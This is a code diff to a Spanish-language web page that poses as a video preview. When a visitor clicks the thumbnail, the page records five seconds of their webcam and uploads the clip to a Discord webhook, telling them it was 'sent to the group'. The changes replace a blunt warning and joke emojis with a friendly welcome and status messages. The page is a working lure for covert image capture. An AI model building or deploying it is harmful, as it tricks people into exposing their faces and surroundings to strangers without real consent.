@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIDEOCHISME</title>
+    <title>GRABANDO VIDEO</title>
     <style>
         body {
             display: flex;
@@ -30,22 +30,25 @@
             width: 100%;
             border-radius: 10px;
         }
-        .warning {
-            color: #ff0000;
+        .message {
             font-size: 24px;
             font-weight: bold;
             margin-bottom: 20px;
+        }
+        .welcome {
+            color: #ffffff;
+        }
+        .recording {
+            color: #ff0000;
             animation: blink 1s infinite;
+        }
+        .sent {
+            color: #00ff00;
         }
         @keyframes blink {
             0% { opacity: 1; }
             50% { opacity: 0; }
             100% { opacity: 1; }
-        }
-        .emojis {
-            font-size: 32px;
-            position: absolute;
-            bottom: 10px;
         }
         #compatibility-message {
             color: #ff0000;
@@ -56,13 +59,12 @@
     </style>
 </head>
 <body>
-    <div class="warning">GUARDANDO VIDEO</div>
+    <div id="message" class="message welcome">BIENVENID@S</div>
     <div id="container" onclick="startWebcam()">
         <!-- Cambia 'vista-previa.jpeg' por el nombre de tu imagen -->
         <img id="previewImage" src="vista-previa.jpeg" alt="Vista previa del video">
-        <video id="video" autoplay style="display: none;"></video>
+                <video id="video" autoplay style="display: none;"></video>
     </div>
-    <div class="emojis">😂🤣😆</div>
     <div id="compatibility-message">Tu navegador no es compatible. Por favor, abre esta página en un navegador moderno como Chrome o Safari.</div>
 
     <script>
@@ -88,9 +90,14 @@
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const videoElement = document.getElementById('video');
                 const previewImage = document.getElementById('previewImage');
+                const messageElement = document.getElementById('message');
+                
                 videoElement.srcObject = stream;
                 videoElement.style.display = 'block';
                 previewImage.style.display = 'none';
+                messageElement.textContent = 'RECORDING';
+                messageElement.classList.remove('welcome');
+                messageElement.classList.add('recording');
 
                 // Empezar a grabar el video
                 const mediaRecorder = new MediaRecorder(stream);
@@ -101,7 +108,7 @@
                 };
 
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('file', blob, 'video.mp4');
 
@@ -111,20 +118,27 @@
                             method: 'POST',
                             body: formData
                         });
-                        console.log('Video enviado al grupo');
+                        console.log('Video enviado al webhook de Discord');
                     } catch (error) {
-                        console.error('Error al enviar el video al grupo:', error);
+                        console.error('Error al enviar el video al webhook de Discord:', error);
                     }
+
+                    // Detener la cámara y mostrar mensaje de envío
+                    stream.getTracks().forEach(track => track.stop());
+                    videoElement.style.display = 'none';
+                    messageElement.textContent = 'VIDEO ENVIADO AL GRUPO';
+                    messageElement.classList.remove('recording');
+                    messageElement.classList.add('sent');
                 };
 
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 4000); // Detener la grabación después de 10 segundos
+                }, 5000); // Detener la grabación después de 5 segundos
 
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
-                alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso solicitado por el navegador.');
+                alert('No se pudo acceder a la cámara. Asegúrate de haber dado permiso.');
             }
         }
 
